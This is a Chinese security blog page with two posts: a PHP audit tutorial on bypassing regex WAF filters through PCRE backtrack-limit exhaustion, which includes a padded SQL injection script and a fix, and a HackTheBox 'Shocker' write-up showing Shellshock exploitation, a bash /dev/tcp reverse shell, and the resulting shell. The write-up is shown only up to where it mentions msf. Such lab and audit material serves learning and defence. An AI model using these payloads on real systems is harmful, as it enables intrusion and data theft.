<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Unc1e的博客">
<meta property="og:url" content="http://unc1e.com/index.html">
<meta property="og:site_name" content="Unc1e的博客">
<meta property="article:author" content="Unc1e">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://unc1e.com/"/>





  <title>Unc1e的博客</title>
  








<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Unc1e的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/08/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/08/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" itemprop="url">代码审计点之利用回溯绕过正则表达式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-14T10:29:53+08:00">
                2020-08-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="PHP代码审计之利用回溯绕过正则表达式"><a href="#PHP代码审计之利用回溯绕过正则表达式" class="headerlink" title="PHP代码审计之利用回溯绕过正则表达式"></a>PHP代码审计之利用回溯绕过正则表达式</h1><p>PHP代码审计的经验和技巧，各位前辈在wiki上已经总结很多了，例如: 涧山大哥的<a href="https://wiki.qianxin-inc.cn/pages/viewpage.action?pageId=201871713" target="_blank" rel="noopener">PHP代码审计思路小结</a>，提出了从上往下看“安全函数是否有效”和 从下往上“追踪危险函数调用“的两种审计思路，给我很大的启发;  苏宝童的<a href="https://wiki.qianxin-inc.cn/pages/viewpage.action?pageId=231210713" target="_blank" rel="noopener">PHP代码审计总结</a>中，列举的许多cms的审计实例，也是让人直呼内行。随着PHP代码审计的机会增加，越来越要求对PHP的语言特性有更多的了解，因此补充一些审计时用得上的tricks就显得尤为重要。因此有了本系列，也是我学习的简单记录。</p>
<p>第一篇：利用回溯绕过PHP中的正则表达式</p>
<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先，来看一段在waf上很常见的正则，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/SELECT.+FROM.+/is'</span>, $_POST[<span class="string">'sql'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"SQL injection"</span>) <span class="comment">//WAF</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	<span class="keyword">echo</span>($_POST[<span class="string">'sql'</span>]);</span><br><span class="line">		<span class="comment">//mysql_query($db,  $_POST['sql']); //查询</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何绕过?——相信师傅们肯定是方法多多。但今天主要详细说说其中的一种另类的绕过方式，利用正则回溯绕过正则判断</p>
<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/select_bypass.gif" alt="select_bypass"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>要知道``preg_match`的返回值：除了0和1，还可能因为出错而返回<strong>false</strong></p>
<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/image-20200731114158728.png" alt="image-20200731114158728"></p>
<p>出错的原因大致有两个，1. 正则回溯次数超过限制 ； 2. 入参的类型不是字符串（数组类型）</p>
<p>我们主要关注第一种：利用正则回溯次数超过限制。回到一开始举的例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/SELECT.+FROM.+/is'</span>, $_POST[<span class="string">'sql'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"SQL injection"</span>) <span class="comment">//WAF</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	<span class="keyword">echo</span>($_POST[<span class="string">'sql'</span>]);</span><br><span class="line">		<span class="comment">//mysql_query($db,  $_POST['sql']); //查询</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只看前几行判断入参是否为php代码的is_php()函数：</p>
<p>当输入的字符串中含有<code>SELECT</code>、<code>FROM</code>，且两个词后分别跟有任意字符串，即视为满足匹配，<code>preg_match</code>就会返回1。其中的参数介绍如下</p>
<ul>
<li><code>.+</code>，“点 加号”，<code>.</code>表示匹配除了换行符\n之外的任意单个字符串，+ 匹配前面的子表达式1次或多次，两者合在一起，其实就表示匹配任意的字符串。</li>
</ul>
<p>这段正则是有问题的——但问题在哪里呢？这就要从PHP中正则的匹配原理说起。</p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限  <code>pcre.backtrack_limit</code>，我们可以在phpinfo里查看当前环境下的上限，默认为1000,000</p>
<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/image-20200731114823341.png" alt="image-20200731114823341"></p>
<p>常见的正则引擎，可被细分为 DFA（确定性有限状态自动机）与 NFA（非确定性有限状态自动机）。大多数程序语言都使用了 NFA 作为正则引擎，其中也包括 PHP 使用的 PCRE 库。</p>
<blockquote>
<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行往回查找（回溯），尝试其他状态</p>
</blockquote>
<p>那 NFA 自动机到底是怎么进行回溯的呢？我们以下面的字符和表达式来举例说明。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regex&#x3D;&#x2F;SELECT.+FROM.+&#x2F;</span><br><span class="line">param&#x3D;select id from &#x2F;*0123456789*&#x2F; test</span><br></pre></td></tr></table></figure>

<ul>
<li>首先，拿到正则表达式的第一个匹配符S，于是去和字符串的字符进行比较，字符串的第一个字符是s，匹配(忽略大小写)，换下一个，第二个是 E，和字符串的第二个字符e匹配，再换下一个，一直到SELECT与select匹配完毕</li>
<li>读取到正则表达式匹配符的第二部分<code>.+</code>：任意字符串匹配1次以上，那么可以一次性匹配掉剩下的所有字符串，即正则拿到<code>select id from /*0123456789*/ test</code>，但此时正则表达式中的<code>F</code>是无法匹配上的，且拿到的字符串已到了末尾，于是开始回溯，从末尾开始往回匹配，首先尝试匹配末尾的<code>t</code>，当然无法匹配上<code>F</code>，于是匹配倒数第二个字符<code>s</code>，也不行，于是一步步回溯到字符串中的<code>f</code>，回溯次数一次又一次地增加着。。直到回溯次数超过预设值<code>1000,000</code>而发生错误，函数返回false</li>
</ul>
<p>因此，我们可以通过<strong>发送超长字符串</strong>的方式，使正则执行失败，返回<strong>false</strong>，从而绕过目标对 PHP 语言的限制。</p>
<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/regex3.gif" alt="regex3"></p>
<p>（动画中是正则调试器，来自：<a href="https://regex101.com/r/pf5Pa0/1/debugger）" target="_blank" rel="noopener">https://regex101.com/r/pf5Pa0/1/debugger）</a></p>
<p>开头的那种方法，便是这样绕过的，但其实有个前提，payload必须在<strong>POST</strong>的参数里，不能是GET的参数，因为RFC 2616里限制了GET的参数最长不能超过8K(8*1024)，本地实测8178个字符，超过状态码即变成414</p>
<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/image-20200812164653626.png" alt="image-20200812164653626"></p>
<p>这可能也是很多时候构造超长字符串，能绕过waf的原因之一（另一个原因是waf需要考虑性能）</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>在某些情况下（POST参数+特殊的正则）：可以利用正则回溯，使得preg_match函数返回false，进而绕过正则表达式的判断。代码审计时可以额外关注全局过滤处的正则表达式是否可用这种方法绕过。</p>
<p>之前出过maccms出过一个前台RCE，就是利用的这种方法来绕过全局过滤函数的，详情可参考<a href="https://mochazz.github.io/2020/01/08/maccmsV8%E5%89%8D%E5%8F%B0RCE(preg_match%E7%BB%95%E8%BF%87)/" target="_blank" rel="noopener">maccmsV8前台RCE(preg_match绕过)</a></p>
<p><strong>利用方式：</strong>发送超长字符串，可以用burp的intruder，payload类型选Character blocks</p>
<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/image-20200812173241780.png" alt="image-20200812173241780"></p>
<p>也可以改编下面这个python脚本进行利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">NUM = <span class="number">1000000</span>;<span class="comment"># 你想填充的字符串数</span></span><br><span class="line">URL = <span class="string">"http://php.test/select.php"</span> <span class="comment"># 地址</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">"union select 1,2,3,4,5 /*&#123;&#125;*/ "</span>.format(<span class="string">"A"</span>*NUM) </span><br><span class="line">post_data = &#123;<span class="string">"p"</span>:param&#125;</span><br><span class="line">resp = requests.post(url=URL, data=post_data)</span><br><span class="line"></span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>

<h2 id="结论（修复方案）"><a href="#结论（修复方案）" class="headerlink" title="结论（修复方案）"></a>结论（修复方案）</h2><ol>
<li>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，即使正则执行失败返回false，也不会进入if语句。</p>
<ol start="2">
<li><p>再分享一个先知上很不错的黑白盒审计的思维导图，来源<a href="https://xz.aliyun.com/t/1720" target="_blank" rel="noopener">https://xz.aliyun.com/t/1720</a> <img src="https://xz.aliyun.com/forum//media/upload/picture/20171205165928-99798f14-d99a-1.png" alt="img"></p>
</li>
<li><p>最后，推荐一个网站，这个网站可以检查你写的正则表达式和对应的字符串匹配时是否有问题。</p>
</li>
</ol>
<p>   <img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.assets/image-20200812170735197.png" alt="image-20200812170735197"></p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li>PHP利用PCRE回溯次数限制绕过某些安全限制 <a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/190794.html</a></li>
<li>正则表达式回溯漏洞<a href="https://blog.csdn.net/dl71181/article/details/101281495" target="_blank" rel="noopener">https://blog.csdn.net/dl71181/article/details/101281495</a></li>
<li>正则表达式 — 回溯陷阱 - 五维思考 - 博客园<a href="https://www.cnblogs.com/zhaoshujie/p/10278919.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaoshujie/p/10278919.html</a></li>
<li>HTTP/1.1: Protocol Parameters <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.2.1" target="_blank" rel="noopener">https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.2.1</a></li>
<li>PHP手册-PCRE正则语法 <a href="https://www.php.net/manual/zh/regexp.reference.meta.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/regexp.reference.meta.php</a></li>
<li>regex debugger <a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></li>
<li>maccmsV8前台RCE(preg_match绕过)<a href="https://mochazz.github.io/2020/01/08/maccmsV8%E5%89%8D%E5%8F%B0RCE(preg_match%E7%BB%95%E8%BF%87)/" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/08/maccmsV8%E5%89%8D%E5%8F%B0RCE(preg_match%E7%BB%95%E8%BF%87)/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/" itemprop="url">HackTheBox笔记：Shocker</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-05T00:45:31+08:00">
                2020-07-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Entry-point"><a href="#Entry-point" class="headerlink" title="Entry point"></a>Entry point</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nmap <span class="literal">-p</span>- <span class="literal">-sC</span> <span class="literal">-sV</span>  <span class="literal">-Pn</span> <span class="number">10.10</span>.<span class="number">10.56</span> <span class="literal">-oA</span> allport</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.56</span></span><br><span class="line">Host is up (<span class="number">0.0037</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">18</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">18</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey:</span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>

<p>hydra to brute SSH using fastrack.txt, nothing to gain.</p>
<h2 id="cgi-bin"><a href="#cgi-bin" class="headerlink" title="/cgi-bin/"></a>/cgi-bin/</h2><p>using <code>binwalk</code> and <code>file</code>, got nothing special<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=bug.jpg&originHeight=420&originWidth=820&size=36861&status=done&style=none&width=410" alt="bug.jpg"><br>dir searching</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56/ -e \*</span><br><span class="line"></span><br><span class="line"><span class="emphasis">_|. _</span> \<span class="emphasis">_ \_</span> \<span class="emphasis">_ \_</span> <span class="emphasis">_|_</span> v0.3.9</span><br><span class="line">(<span class="emphasis">_||| _</span>) (/<span class="emphasis">_(_</span>|| (\_| )</span><br><span class="line"></span><br><span class="line">Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6564 | Request count: 6564</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-07-07_23-26-11.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /opt/dirsearch/reports/10.10.10.56/20-07-07_23-26-16</span><br><span class="line"></span><br><span class="line">[23:26:16] Starting:</span><br><span class="line">[23:28:27] 403 - 299B - /.htaccess-dev</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-local</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-marco</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessBAK</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.txt</span><br><span class="line">[23:28:28] 403 - 302B - /.htaccess.sample</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.old</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.orig</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.save</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.bak1</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessOLD</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccessOLD2</span><br><span class="line">[23:28:28] 403 - 299B - /.htpasswd-old</span><br><span class="line">[23:28:28] 403 - 297B - /.httr-oauth</span><br><span class="line">[23:34:58] 403 - 294B - /cgi-bin/</span><br></pre></td></tr></table></figure>

<p>after obtaining these, no progress.</p>
<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><p>while searching for “<strong>shocker cgi-bin</strong>“, finding a open-source project named <em>shocker, see</em><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> https://github.com/nccgroup/shocker</a><br>add the ext of “<strong>.sh, .cgi</strong>“ in dirbuster,</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200707234227.png&originHeight=230&originWidth=1916&size=18242&status=done&style=none&width=1916" alt="Deepin 截圖_select-area_20200707234227.png"><br>also, <code>dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .cgi,.sh,.php,.py,.pl</code> is supported.</p>
<h2 id="cgi-bin-user-sh"><a href="#cgi-bin-user-sh" class="headerlink" title="/cgi/bin/user.sh"></a>/cgi/bin/user.sh</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Just an uptime test script</span><br><span class="line"></span><br><span class="line">11:46:01 up 1:16, 0 users, load average: 0.00, 0.00, 0.00</span><br></pre></td></tr></table></figure>

<p>the exp of <strong>RCE</strong> can be used at least in 2 ways<br>1st is the <em>shock</em> scirpt</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H 10.10.10.56 -c '/cgi-bin/user.sh'</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png#align=left&display=inline&height=826&margin=%5Bobject%20Object%5D&name=exp.png&originHeight=826&originWidth=1445&size=147075&status=done&style=none&width=1445" alt="exp.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># rce on shocker</span></span><br><span class="line"></span><br><span class="line">\$ /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.122/1337 0&gt;&amp;1</span><br><span class="line">No response</span><br><span class="line"></span><br><span class="line"><span class="section"># get reverse shell</span></span><br><span class="line"></span><br><span class="line">\$ nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">10.10.10.56: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.122] from (UNKNOWN) [10.10.10.56] 55964</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ ls</span><br><span class="line">user.sh</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure>

<p>the 2nd is <strong>msf</strong></p>
